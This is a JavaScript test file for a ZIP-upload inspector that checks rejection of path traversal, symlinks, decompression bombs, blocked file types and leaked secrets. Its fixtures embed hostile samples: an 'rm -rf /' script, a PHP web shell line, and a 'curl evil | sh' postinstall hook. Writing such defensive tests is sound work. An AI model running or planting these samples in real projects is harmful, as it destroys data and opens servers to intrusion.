// Avalon Project Bridge (Misión 0400): ZIP reader + inspection. Synthetic archives only; nothing is executed or written.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('node:zlib');
const load = require('../scripts/creative-bridge/continuity-loader.cjs');
const { buildZip, staticSite, PNG } = require('./support/zip-builder.cjs');

const { readZip } = load('src/lib/project-bridge/zip.ts');
const { inspectUpload } = load('src/lib/project-bridge/inspect.ts');
const { safePath, filePolicy, BRIDGE_LIMITS } = load('src/lib/project-bridge/policy.ts');
const reason = r => (r.ok ? 'ok' : r.reason);

test('a valid static site ZIP is read, its root folder stripped, Finder junk skipped, and every file hashed', () => {
  const r = inspectUpload('mi-sitio.zip', staticSite());
  assert.equal(r.ok, true, JSON.stringify(r));
  const { inspection: i, blobs } = r;
  assert.deepEqual(i.files.map(f => f.path), ['contacto.html', 'css/style.css', 'img/logo.png', 'index.html', 'js/app.js']);
  assert.equal(i.framework, 'static');
  assert.equal(i.entry, 'index.html');
  assert.equal(i.deployable, 'static');
  assert.equal(i.suggestedCategory, 'website');
  assert.equal(i.skipped.length, 1, '__MACOSX AppleDouble file skipped, not an error');
  assert.match(i.files[0].sha256, /^[0-9a-f]{64}$/);
  assert.equal(blobs.size, 5);
  assert.equal(i.files.find(f => f.path === 'img/logo.png').mime, 'image/png');
});

test('identical content in a different ZIP produces the same content digest (duplicate detection)', () => {
  const a = inspectUpload('a.zip', staticSite('X', 'one/'));
  const b = inspectUpload('b.zip', staticSite('X', 'two/'));
  const c = inspectUpload('c.zip', staticSite('Y', 'one/'));
  assert.equal(a.inspection.contentDigest, b.inspection.contentDigest);
  assert.notEqual(a.inspection.contentDigest, c.inspection.contentDigest);
});

test('a single HTML file is accepted as index.html', () => {
  const r = inspectUpload('landing.html', new TextEncoder().encode('<!doctype html><title>Landing</title>'));
  assert.equal(r.ok, true);
  assert.equal(r.inspection.entry, 'index.html');
});

test('malicious ZIPs are refused before anything is extracted', () => {
  const cases = {
    path_traversal: buildZip([{ name: '../../etc/passwd.txt', data: 'x' }]),
    absolute_path: buildZip([{ name: '/etc/x.html', data: 'x' }]),
    backslash_in_name: buildZip([{ name: '..\\..\\win.html', data: 'x' }]),
    symlink_entry: buildZip([{ name: 'link.html', data: '/etc/passwd', mode: 0o120777 }]),
    special_file_entry: buildZip([{ name: 'dev.html', data: '', mode: 0o020666 }]),
    encrypted_entry: buildZip([{ name: 'a.html', data: 'x', flags: 0x801 }]),
    duplicate_entry: buildZip([{ name: 'Index.html', data: 'a' }, { name: 'index.html', data: 'b' }]),
    zip64_not_supported: buildZip([{ name: 'a.html', data: 'x' }], { zip64Locator: true }),
    unsupported_compression: buildZip([{ name: 'a.html', data: 'xxxx', method: 12 }]),
    control_character_in_name: buildZip([{ name: 'a\u0001.html', data: 'x' }]),
    file_directory_collision: buildZip([{ name: 'a.html', data: 'x' }, { name: 'a.html/b.html', data: 'y' }]),
  };
  for (const [want, zip] of Object.entries(cases)) assert.equal(reason(readZip(zip)), want, want);
});

test('decompression bombs: extreme ratio refused from the directory; a lying size cannot allocate more than declared', () => {
  const bomb = Buffer.alloc(14 * 1024 * 1024, 0); // 14 MiB of zeros deflates to ~14 KiB (ratio ~1000)
  assert.equal(reason(readZip(buildZip([{ name: 'bomb.html', data: bomb }]))), 'compression_ratio_too_high');
  // Declares 10 bytes but inflates to 1 MiB: inflate stops at the declared size and the entry is rejected.
  const liar = buildZip([{ name: 'liar.html', data: Buffer.alloc(1 << 20, 65), declaredSize: 10 }]);
  assert.equal(reason(readZip(liar)), 'corrupt_or_lying_entry');
  // Correct sizes but a forged CRC (tampered content) is rejected.
  assert.equal(reason(readZip(buildZip([{ name: 'a.html', data: 'hola', crc: 1234 }]))), 'crc_mismatch');
  // Local header disagreeing with the central directory (classic parser-confusion trick).
  assert.equal(reason(readZip(buildZip([{ name: 'a.html', data: 'hola', method: 8, localMethod: 0 }]))), 'local_header_mismatch');
});

test('size and count limits are enforced', () => {
  const tight = { ...BRIDGE_LIMITS, entries: 3, fileBytes: 100, totalUncompressedBytes: 150, archiveBytes: 10_000 };
  assert.equal(reason(readZip(staticSite(), tight)), 'too_many_entries');
  assert.equal(reason(readZip(buildZip([{ name: 'a.html', data: 'x'.repeat(101) }]), tight)), 'file_too_large');
  assert.equal(reason(readZip(buildZip([{ name: 'a.html', data: 'x'.repeat(90) }, { name: 'b.html', data: 'y'.repeat(90) }]), tight)), 'archive_uncompressed_too_large');
  assert.equal(reason(readZip(new Uint8Array(10_001), tight)), 'archive_too_large');
  assert.equal(reason(readZip(new Uint8Array(100))), 'not_a_zip');
  assert.equal(inspectUpload('x.exe', new Uint8Array([0x4d, 0x5a, 0, 0])).reason, 'unsupported_upload_type');
});

test('dangerous files are refused with the exact path and reason (whole import rejected, nothing silently dropped)', () => {
  const r = inspectUpload('bad.zip', buildZip([
    { name: 'index.html', data: '<h1>ok</h1>' },
    { name: 'tools/run.sh', data: 'rm -rf /' },
    { name: 'app.exe', data: Buffer.from([0x4d, 0x5a, 0x90, 0]) },
    { name: '.env', data: 'SECRET=1' },
    { name: 'fake.png', data: Buffer.from([0x4d, 0x5a, 0x90, 0, 1, 2]) },
    { name: 'config.js', data: 'const k = "sk_live_' + 'a'.repeat(24) + '";' },
    { name: 'node_modules/x/index.js', data: '1' },
    { name: '.git/config', data: '[core]' },
    { name: 'api.php', data: '<?php system($_GET["c"]);' },
  ]));
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'rejected_files');
  const by = Object.fromEntries(r.problems.map(p => [p.path, p.reason]));
  assert.equal(by['tools/run.sh'], 'blocked_file_type:sh');
  assert.equal(by['app.exe'], 'blocked_file_type:exe');
  assert.equal(by['.env'], 'secret_or_system_file');
  assert.equal(by['fake.png'], 'content_does_not_match_type', 'an executable renamed to .png is detected by magic bytes');
  assert.equal(by['config.js'], 'secret_detected:stripe_live_secret');
  assert.equal(by['node_modules/x/index.js'], 'blocked_directory');
  assert.equal(by['.git/config'], 'blocked_directory');
  assert.equal(by['api.php'], 'blocked_file_type:php');
  assert.ok(!JSON.stringify(r).includes('aaaaaaaaaaaaaaaa'), 'the secret value itself is never echoed back');
});

test('framework detection reads package.json without running it and flags install scripts', () => {
  const pkg = { name: 'tienda', dependencies: { next: '15.0.0', react: '19.0.0' }, scripts: { build: 'next build', postinstall: 'curl evil | sh' } };
  const r = inspectUpload('next.zip', buildZip([
    { name: 'package.json', data: JSON.stringify(pkg) },
    { name: 'app/page.tsx', data: 'export default function P(){return null}' },
    { name: 'public/logo.png', data: PNG, method: 0 },
  ]));
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.inspection.framework, 'nextjs');
  assert.equal(r.inspection.deployable, 'needs_build', 'dynamic projects are never deployed without an isolated build');
  assert.equal(r.inspection.suggestedCategory, 'apps');
  assert.deepEqual(r.inspection.packageInfo.installScripts, ['postinstall']);
  assert.ok(r.inspection.warnings.includes('install_scripts_present:postinstall'));
  assert.ok(r.inspection.warnings.includes('no_lockfile'));
});

test('path and file policy helpers', () => {
  assert.deepEqual(safePath('a/b/c.html'), { ok: true, path: 'a/b/c.html' });
  assert.deepEqual(safePath('dir/'), { ok: true, path: 'dir' });
  assert.equal(safePath('a//b.html').ok, false);
  assert.equal(safePath('C:/x.html').reason, 'absolute_path');
  assert.equal(safePath('x/'.repeat(30) + 'a.html').reason, 'path_too_deep');
  assert.deepEqual(filePolicy('README'), { ok: true });
  assert.equal(filePolicy('keys/id_rsa').reason, 'secret_or_system_file');
  assert.equal(filePolicy('a.weird').reason, 'file_type_not_allowed:weird');
  assert.ok(zlib.crc32, 'node:zlib crc32 is available in this runtime');
});

// Operation Phoenix (from #169): a token without the import scope gets 403, not a misleading 503.
test("import status route maps insufficient_scope (42501) to 403", () => {
  const src = require("node:fs").readFileSync("src/app/api/project-bridge/v1/imports/[importId]/route.ts", "utf8");
  assert.match(src, /"42501": \["insufficient_scope", 403\]/);
  const sql = require("node:fs").readFileSync("supabase/migrations/20261112190000_bridge_scope_hardening.sql", "utf8");
  assert.match(sql, /insufficient_scope' using errcode = '42501'/);
});
